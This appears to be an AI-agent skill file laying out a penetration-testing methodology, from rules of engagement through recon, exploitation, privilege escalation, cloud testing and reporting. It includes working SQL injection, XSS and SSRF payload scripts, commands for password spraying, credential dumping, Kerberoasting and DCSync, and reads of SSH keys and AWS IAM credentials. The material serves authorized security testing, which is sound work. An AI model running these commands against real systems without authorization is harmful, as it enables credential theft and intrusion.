---
name: penetration-testing
description: >
  Penetration Testing — structured methodology, tools, and reporting for web application,
  network, cloud, and API penetration tests. Use when the user asks about penetration testing,
  pentest, ethical hacking, Burp Suite, OWASP, exploit, vulnerability assessment, red team,
  or security testing methodology.
version: "2.0.0"
author: "j4flmao"
license: "MIT"
compatibility:
  claude-code: true
  cursor: true
  codex: true
  windsurf: true
tags: [security, penetration-testing, pentest, phase-8]
---

# Penetration Testing

## Purpose
Conduct structured penetration tests following industry-standard methodology (PTES, OWASP, OSSTMM) covering web applications, network infrastructure, cloud environments, APIs, and reporting with actionable remediation guidance. Validate security controls through adversarial simulation.

## Agent Protocol

### Trigger
- "penetration testing", "pentest", "ethical hacking", "vulnerability assessment"
- "OWASP", "Burp Suite", "ZAP", "Metasploit", "Nmap", "Nessus"
- "web app pentest", "API pentest", "network pentest", "cloud pentest"
- "red team", "adversarial simulation", "exploit", "privilege escalation"
- "SQL injection", "XSS", "SSRF", "RCE", "Active Directory attack"
- "CVSS", "pentest report", "remediation", "retesting"

### Input Context
- Scope: web app URL, API endpoints, network ranges, cloud accounts, mobile app
- Authentication details (if any): user roles, 2FA status, session management
- Threat model and business impact context for risk prioritization
- Previous pentest reports for regression testing
- Exclusions: production data, specific systems, testing windows

### Output Artifact
Pentest plan (scope, rules of engagement, methodology), technical findings with CVSS scores, evidence artifacts (screenshots, request/response pairs, PoC scripts), executive summary report, remediation roadmap.

### Response Format
```
## Executive Summary
{business context, risk profile, key findings, strategic recommendations}

## Technical Findings
| ID | Finding | CVSS | Impact | Affected System | Remediation |
|----|---------|------|--------|-----------------|-------------|

## Methodology
{Phases performed, tools used, techniques, coverage by OWASP category}
```

### Completion Criteria
- [ ] Rules of engagement defined and approved by authorized stakeholders
- [ ] All phases completed: recon, scanning, exploitation, post-exploitation, reporting
- [ ] All findings documented with CVSSv3.1 scores, reproducible steps, and evidence
- [ ] Executive summary written for non-technical stakeholders
- [ ] Remediation recommendations provided with priority order and effort estimates
- [ ] Retesting window defined and scheduled
- [ ] False positives from automated scanners validated and removed
- [ ] Data securely destroyed after testing (production data exposure handling)

## Architecture / Decision Trees

### Testing Type Decision Tree

```
What is being tested?
├── Web Application
│   ├── Customer-facing web app → OWASP Web App Testing Guide (full scope)
│   ├── Internal web app → OWASP Top 10 + authentication/authorization focus
│   └── SPA (React, Angular, Vue) → API testing focus + client-side security
├── API
│   ├── REST API → OWASP API Top 10, endpoint enumeration, parameter fuzzing
│   ├── GraphQL → Introspection, query depth analysis, batch attacks, auth bypass
│   └── gRPC → Protocol inspection, message manipulation, service reflection
├── Mobile Application
│   ├── Android → OWASP MASVS, static analysis (APK), runtime manipulation (Frida)
│   └── iOS → OWASP MASVS, IPA analysis, runtime manipulation (Frida, Objection)
├── Network Infrastructure
│   ├── Internal network → AD attack paths, privilege escalation, lateral movement
│   └── External network → Open ports, service enumeration, vulnerability scanning
├── Cloud Infrastructure
│   ├── AWS → IAM enumeration, S3 bucket review, Lambda injection, SSRF to metadata
│   ├── Azure → RBAC review, Key Vault access, App Service exploitation
│   └── GCP → IAM analysis, Cloud SQL review, Compute Engine metadata
└── Social Engineering
    ├── Phishing → Campaign design, payload delivery, credential harvesting
    └── Physical → Tailgating, badge cloning, device planting

What is the testing approach?
├── Black box (no prior knowledge) → Full recon, wider scope, more time
├── Gray box (some credentials, docs) → Deeper testing, better coverage, recommended
└── White box (full source code + access) → Deepest analysis, code review + dynamic testing
```

### Methodology Selection

```
What standard should be followed?
├── Web application → OWASP Testing Guide v4.2 (most comprehensive for web)
├── Comprehensive → PTES (Penetration Testing Execution Standard — 7 phases)
├── Compliance-driven → OSSTMM (Open Source Security Testing Methodology Manual)
├── Cloud → Cloud Security Alliance (CSA) Cloud Pentest Guidelines
└── Mobile → OWASP Mobile Security Testing Guide (MSTG)
```

## Workflow

### Step 1: Planning and Scoping

**Rules of Engagement:**
```yaml
rules_of_engagement:
  engagement_id: "PT-2026-Q2-APP-01"
  tester_team: "Internal Security Team / Third Party"
  testing_period:
    start: "2026-06-01T09:00:00Z"
    end: "2026-06-12T18:00:00Z"
    after_hours: false
    weekend: false

  scope:
    in_scope:
      - url: "https://app.company.com"
      - api: "https://api.company.com/v2/*"
      - subdomains: ["*.app.company.com"]
      - ips: ["10.0.1.0/24"]
    out_of_scope:
      - "https://admin.company.com (third-party managed)"
      - "10.0.0.0/24 (production database subnet)"
      - "Any production customer data"
      - "Third-party integrations (Stripe, SendGrid)"

  authentication:
    provided_roles: ["admin", "user", "read-only"]
    self_registration: true
    account_login_rate_limit: "60 req/min"
    mfa: false

  constraints:
    - "No denial-of-service testing"
    - "No social engineering without separate approval"
    - "No testing during company blackout dates (month-end closing)"
    - "Maximum 50 concurrent requests per IP"
    - "Data exfiltration: Use test identifiers (demo- prefix)"
    - "Stop immediately if production data is unexpectedly accessed"

  communication:
    - "Daily status report by 17:00"
    - "Critical finding notification within 1 hour"
    - "Emergency stop contact: security-team@pagerduty.com"

  data_handling:
    - "All test data encrypted at rest (AES-256)"
    - "Production data destroyed immediately if encountered"
    - "Final report encrypted with client PGP key"
    - "Test artifacts retained 90 days, then securely deleted"
```

### Step 2: Reconnaissance

**Passive Reconnaissance:**
```bash
# DNS enumeration
dig axfr @ns1.company.com company.com        # Zone transfer (rarely works but check)
dig any company.com @8.8.8.8                   # All DNS records
dnsrecon -d company.com -t axfr                # Automated zone transfer attempt
dnsrecon -d company.com -D subdomains-top1mil.txt -t brt  # Subdomain bruteforce

# Subdomain discovery
subfinder -d company.com -o subdomains.txt     # Fast passive subdomain discovery
amass enum -d company.com -o amass-results     # Comprehensive OSINT subdomain enum
sublist3r -d company.com -o sublister.txt      # Subdomain discovery via search engines

# Technology fingerprinting
whatweb https://app.company.com -v             # Web technology stack identification
wappalyzer -a https://app.company.com          # Technology detection (standalone CLI)
webanalyze -host app.company.com -crawl 1       # Fast tech detection

# Email and employee discovery
theHarvester -d company.com -b google,linkedin,bing  # Email/employee discovery

# ASN and IP range
whois -h whois.radb.net " -i origin AS12345"  # Find all IPs for organization
```

**Active Reconnaissance:**
```bash
# Port scanning
nmap -sS -sV -sC -O -p- --min-rate=1000 -oA full-scan company.com  # Full port scan
nmap -sS -sV -A -p 80,443,8080,8443 -oA web-scan company.com        # Web-specific
masscan -p1-65535 --rate=10000 10.0.1.0/24 -oL masscan-output       # Fast port scanning

# Web application crawling
katana -u https://app.company.com -d 5 -o endpoints.txt             # Fast Go-based crawler
gospider -s https://app.company.com -o crawl-output -c 10 -d 3      # Spider with JS rendering
hakrawler -url https://app.company.com -depth 3 -plain -insecure    # Simple crawler

# Technology-specific enumeration
nmap --script http-enum -p 80,443 company.com                       # Directory enumeration
nmap --script http-methods --script-args http-methods.url-path=/api -p 443 company.com  # HTTP methods
```

### Step 3: Vulnerability Scanning and Analysis

```bash
# Automated vulnerability scanning
nmap --script vuln -p 80,443 company.com -oA nmap-vuln              # Nmap vuln scripts
nuclei -u https://app.company.com -t cves/ -o nuclei-cves.txt      # CVE-specific scanning
nuclei -u https://app.company.com -t exposures/ -o nuclei-exposures.txt  # Configuration exposures

# Web application scanning
zap-full-scan.py -t https://app.company.com -r zap-report.html     # ZAP full automated scan
nikto -h https://app.company.com -o nikto-output.txt               # Legacy web scanner
wapiti -u https://app.company.com -o wapiti-report                  # Web vulnerability scanner
```

**Manual Verification of Findings:**
```python
import requests

def verify_sqli(endpoint: str, param: str) -> dict:
    """Verify potential SQL injection with time-based and error-based payloads."""
    results = {"endpoint": endpoint, "param": param, "vulnerable": False, "payloads": []}

    # Time-based blind SQL injection
    payloads = [
        f"{param}' OR SLEEP(5)--",
        f"{param}' WAITFOR DELAY '0:0:5'--",
        f"{param}'; SELECT pg_sleep(5);--",
    ]

    for payload in payloads:
        try:
            url = f"{endpoint}?{payload}"
            start = time.time()
            response = requests.get(url, timeout=10)
            elapsed = time.time() - start

            if elapsed > 4.5:  # Response took > 4.5 seconds = likely time-based SQLi
                results["vulnerable"] = True
                results["payloads"].append({
                    "payload": payload,
                    "response_time": elapsed,
                    "status_code": response.status_code
                })
        except requests.Timeout:
            results["vulnerable"] = True
            results["payloads"].append({
                "payload": payload,
                "response_time": "timeout"
            })

    return results
```

### Step 4: Exploitation

**Web Application Exploitation:**
```python
import requests

def exploit_xss_stored(target_url: str, session: requests.Session) -> bool:
    """Test for stored XSS by submitting payload and checking if it executes."""
    xss_payload = "<script>alert('XSS-'+document.cookie)</script>"

    # Submit payload via form
    payload_data = {
        "comment": xss_payload,
        "name": "pentest-user",
        "submit": "Submit"
    }
    submit_response = session.post(f"{target_url}/comment", data=payload_data)

    # Check if payload rendered without encoding
    check_response = session.get(target_url)
    if xss_payload in check_response.text:
        return True
    return False

def exploit_ssrf(base_url: str, session: requests.Session) -> list:
    """Test for SSRF by attempting to reach internal services."""
    findings = []
    internal_targets = [
        "http://169.254.169.254/latest/meta-data/",       # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://127.0.0.1:6379",                             # Redis
        "http://127.0.0.1:9200/_cat/indices",                 # Elasticsearch
        "file:///etc/passwd",                                 # Local file read
    ]

    for target in internal_targets:
        try:
            response = session.get(
                f"{base_url}/fetch?url={target}",
                timeout=5,
                allow_redirects=False
            )
            if response.status_code == 200 and response.text:
                findings.append({
                    "target": target,
                    "status": "accessible",
                    "response_preview": response.text[:200]
                })
        except (requests.ConnectionError, requests.Timeout):
            findings.append({"target": target, "status": "blocked"})

    return findings
```

**Active Directory Attack Simulation:**
```bash
# AD enumeration and attack
bloodhound-python -d company.com -u 'testuser' -p 'password' -gc dc.company.com -c all
nxc smb 10.0.1.0/24 -u users.txt -p passwords.txt --continue-on-success  # Password spraying
nxc smb 10.0.1.0/24 -u 'user' -p 'pass' --shares                           # Enum shares
nxc smb 10.0.1.0/24 -u 'user' -p 'pass' -M lsassy --module-args "lsassy"  # Dump creds

# Kerberos attacks
impacket-GetNPUsers -dc-ip 10.0.1.10 -request company.com/users  # AS-REP roasting
impacket-GetUserSPNs -dc-ip 10.0.1.10 -request company.com/users # Kerberoasting
impacket-secretsdump -just-dc-ntlm company.com/admin:password@10.0.1.10  # DCSync

# Kerberos delegation attacks
impacket-findDelegation company.com/admin:password@10.0.1.10
```

### Step 5: Post-Exploitation and Privilege Escalation

**Linux Privilege Escalation:**
```bash
# Automated enumeration
wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh
./linpeas.sh > linpeas-output.txt

# Key checks
sudo -l                              # Sudo permissions
find / -perm -4000 2>/dev/null       # SUID binaries
ls -la /etc/shadows?                  # World-readable shadow
cat /etc/crontab                     # Cron jobs
ps aux | grep root                   # Processes running as root
cat ~/.ssh/id_rsa                   # SSH keys
env | grep -i secret                 # Secrets in environment
cat /var/log/syslog | grep -i password  # Passwords in logs
uname -a && cat /etc/lsb-release     # Kernel version for local exploits
```

**Windows Privilege Escalation:**
```bash
# Automated enumeration
winPEAS.exe > winpeas-output.txt
PowerUp.ps1: Invoke-AllChecks

# Key checks
whoami /priv                       # Available privileges (SeImpersonate, SeDebug)
net localgroup administrators       # Local admin group members
schtasks /query /fo LIST /v        # Scheduled tasks
wmic service get name,pathname     # Service paths for unquoted paths
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run  # Run keys
Get-ChildItem -Path C:\Users\*\AppData\Local\Temp\ -Recurse   # Temp files
Get-WmiObject -Class Win32_Processor | Select-Object -Property *  # System info
```

### Step 6: Cloud-Specific Testing

**AWS IAM Enumeration:**
```bash
# Brute force IAM permissions (no logs generated)
aws-enumerator --access-key AKIA... --secret-key ... | tee iam-enum.txt
# Enumerate user/role/policy
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-account-authorization-details

# S3 bucket enumeration
aws s3 ls s3://bucket-name --no-sign-request  # Public bucket listing
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name
aws s3api get-public-access-block --bucket bucket-name

# Check for SSRF to metadata endpoint
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Cloud Metadata Service Abuse:**
```python
def check_aws_metadata(endpoint: str) -> dict:
    """Check if application is vulnerable to SSRF to AWS metadata endpoint."""
    ssrf_url = f"{endpoint}/fetch?url=http://169.254.169.254/latest/meta-data/"
    response = requests.get(ssrf_url, timeout=5)

    if "iam" in response.text:
        # Metadata accessible — can now get IAM credentials
        creds_url = f"{endpoint}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        creds_response = requests.get(creds_url, timeout=5)
        return {
            "metadata_accessible": True,
            "iam_credentials": creds_response.json()
        }
    return {"metadata_accessible": False}
```

### Step 7: Reporting

**Executive Summary Template:**
```markdown
# Penetration Test Report: Company Web Application
**Date:** June 2026
**Tester:** Security Team
**Classification:** CONFIDENTIAL

## Executive Summary
{3-4 paragraph summary: scope, methodology, overall risk rating, key findings, strategic recommendations}

**Risk Overview:**
| Severity | Count | Description |
|----------|-------|-------------|
| Critical | 2 | Remote code execution, authentication bypass |
| High | 5 | SQL injection, privilege escalation, SSRF |
| Medium | 8 | XSS, information disclosure, CSRF |
| Low | 12 | Missing security headers, verbose error messages |
| Info | 15 | TLS configuration, banner disclosure |

**Overall Risk Rating: HIGH** — Multiple critical vulnerabilities found that could lead to complete compromise.

**Key Findings:**
1. **CRITICAL**: SQL Injection in `/api/orders` endpoint — unauthenticated access to database
2. **CRITICAL**: SSRF in document preview feature — AWS metadata accessible, IAM credentials exposed
3. **HIGH**: Privilege escalation via insecure direct object reference (IDOR)
4. **MedIUM**: Stored XSS in user profile "bio" field — affects other users

**Strategic Recommendations:**
1. Implement parameterized queries across all database interactions (2-3 weeks)
2. Restrict outbound network access from application servers (1 week)
3. Implement proper authorization checks for all API endpoints (2 weeks)
4. Deploy WAF with OWASP CRS as compensating control during remediation (1 week)
```

**Finding Detail Template:**
```markdown
## Finding 001: SQL Injection in /api/orders endpoint
**Severity:** CRITICAL (CVSS 9.8)
**CWE:** CWE-89 (SQL Injection)
**OWASP:** A03:2021 (Injection)

**Description:**
The `/api/orders` endpoint is vulnerable to time-based blind SQL injection via the `order_id` parameter. An unauthenticated attacker can extract arbitrary data from the database.

**Vulnerable Endpoint:**
```
GET /api/orders?order_id=123
```

**Proof of Concept:**
```bash
# Time-based detection (5 second delay)
curl "https://app.company.com/api/orders?order_id=123' OR SLEEP(5)--"
# Response: 5.2 seconds (confirmed)

# Extract database version
curl "https://app.company.com/api/orders?order_id=123' UNION SELECT @@version--"
```

**Impact:**
An attacker can extract all data from the database including: user credentials (password hashes), PII, financial records, session tokens.

**Affected Systems:**
- Production database (PostgreSQL)
- Application server (hosted on AWS EC2)

**Remediation:**
Replace string concatenation with parameterized queries:
```python
# VULNERABLE
cursor.execute(f"SELECT * FROM orders WHERE id = {order_id}")

# FIXED
cursor.execute("SELECT * FROM orders WHERE id = %s", (order_id,))
```

**Compensating Controls:**
- WAF rule to block SQLi patterns (immediate)
- Database account with least privileges (24 hours)
- Network segmentation: app server cannot reach DB directly (1 week)

**References:**
- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89
```

### Step 8: Remediation Verification (Retesting)

```yaml
retesting_workflow:
  timing:
    - "CRITICAL: Retest within 5 business days of fix deployment"
    - "HIGH: Retest within 10 business days"
    - "MEDIUM: Retest within next sprint cycle"
    - "LOW: Verify during next scheduled assessment"

  retest_type:
    - "Full retest: All findings verified"
    - "Focused: Only remediated findings"
    - "Regression: Ensure fix didn't introduce new vulnerabilities"

  verification:
    - "Same methodology as initial finding"
    - "Confirm vulnerability no longer exploitable"
    - "Test that fix didn't break adjacent functionality"
    - "Document retest results: Fixed, Partial, Not Fixed, Wont Fix"

  acceptance:
    - "All CRITICAL and HIGH findings must be verified as Fixed"
    - "MEDIUM findings: Accept partial fix with compensating controls"
    - "LOW findings: Accept documentation and planned remediation date"
    - "Accepted risks: Documented with business owner sign-off and expiry"

  reporting:
    - "Retest results appended to original report"
    - "Executive summary updated with remediation status"
    - "Open findings tracked until closure"
    - "Quarterly open finding review with management"
```

## Common Pitfalls

### Pitfall 1: No Rules of Engagement
Testing without clear scope, constraints, and communication plan creates legal and operational risk. Always get signed RoE before testing. Include emergency stop procedures.

### Pitfall 2: Relying Only on Automated Scanners
Automated scanners find only known vulnerabilities with high false positive rates. Critical findings (business logic flaws, privilege escalation, IDOR) require manual verification. All automated findings must be manually verified.

### Pitfall 3: Testing Only at the Application Layer
Deep testing of web app without checking infrastructure, APIs, cloud, and AD leaves significant blind spots. Attackers don't follow test scope boundaries.

### Pitfall 4: Not Testing Authentication Properly
Testing with only one user role misses privilege escalation paths. Test with: anonymous, unauthenticated, low-privilege user, high-privilege user, and admin. Check for horizontal and vertical privilege escalation.

### Pitfall 5: No Data Exfiltration Verification
Finding a vulnerability doesn't show business impact. Always demonstrate what an attacker could access: PII, financial data, credentials, source code. Attach evidence to findings.

### Pitfall 6: Ignoring API Endpoints
Modern SPAs and mobile apps rely heavily on APIs. API vulnerabilities (OWASP API Top 10) are often missed by traditional web scanners. Always test APIs separately with: endpoint enumeration, parameter fuzzing, auth bypass, rate limiting.

### Pitfall 7: No Post-Exploitation
Stopping at initial access misses the full impact. After exploitation, demonstrate: privilege escalation, lateral movement, data access, persistence. Full attack chain shows true risk.

### Pitfall 8: Incomplete Remediation Guidance
"Fix the SQL injection" is not actionable. Provide: specific code fix, WAF rule, configuration change, and verification steps. Effort estimate for each remediation.

## Best Practices

- Always obtain signed rules of engagement before testing — scope, constraints, communication plan
- Follow established methodology: OWASP (web), PTES (general), CSA (cloud), MSTG (mobile)
- Manually verify all automated scanner findings — scanners have 20-40% false positive rate
- Test with multiple privilege levels: anonymous, user, admin for complete coverage
- Demonstrate full attack chain: initial access → privilege escalation → data access → lateral movement
- Report with CVSSv3.1 scores, reproducible steps, and remediation guidance
- Use industry-standard tooling: Burp Suite Pro, Nmap, Metasploit, BloodHound, Nuclei
- Conduct retesting within SLA: CRITICAL 5 days, HIGH 10 days, MEDIUM next sprint
- Document findings with: description, impact, PoC, remediation, compensating controls, references
- Destroy test data and artifacts after retention period (typically 90 days)

## Comparison: Testing Types

| Aspect | Web App | API | Network | Cloud | Mobile |
|--------|---------|-----|---------|-------|--------|
| Primary methodology | OWASP WSTG | OWASP API Top 10 | PTES | CSA Guidelines | OWASP MSTG |
| Key tools | Burp Suite, ZAP | Postman, Burp, custom scripts | Nmap, Nessus, BloodHound | ScoutSuite, Prowler, Pacu | Frida, Objection, MobSF |
| Auth testing | Multi-role, session mgmt | Token, API key, OAuth | AD auth, Kerberos | IAM, service accounts | Biometric, token |
| Business logic | Critical | Important | Low | High | Medium |
| Average duration | 5-10 days | 3-5 days | 3-5 days | 3-5 days | 5-10 days |

## Performance Considerations

- Full web app pentest: 5-10 days for medium complexity application
- API pentest: 3-5 days for 50-100 endpoints
- Network internal pentest: 3-5 days for /16 subnet
- Cloud pentest: 3-5 days per provider (AWS, Azure, GCP)
- Report writing: 1-2 days (30% of total engagement time)
- Automated scanning: 1-4 hours per target (Nmap, Nuclei, ZAP)
- Manual testing: 4-8 hours per finding type (SQLi, XSS, SSRF, Auth)

## Rules
- Never test outside authorized scope — signed RoE required before testing
- Use separate test accounts with documented approval — never use production credentials
- Stop immediately if production data exposure is detected
- All findings must include reproducible steps and evidence (screenshots, PoC code)
- CVSS scores must be calculated using CVSSv3.1 methodology with environmental modifiers
- Retesting must verify all remediated findings within SLA
- False positives from automated tools must be manually verified and documented
- Test data and artifacts must be securely destroyed after retention period
- All findings must include specific remediation guidance, not just detection
- Critical findings must be communicated within 1 hour of discovery

## References
  - references/cloud-pentest.md — Cloud Penetration Testing
  - references/methodology-phases.md — Pentest Methodology Phases
  - references/network-pentest.md — Network Penetration Testing
  - references/penetration-testing-advanced.md — Penetration Testing Advanced Topics
  - references/penetration-testing-fundamentals.md — Penetration Testing Fundamentals
  - references/reporting-template.md — Pentest Reporting Template
  - references/web-app-testing.md — Web Application Penetration Testing
## Handoff
Pentest findings can be handed to development for code fixes, infrastructure for network remediation, and management for risk acceptance decisions.
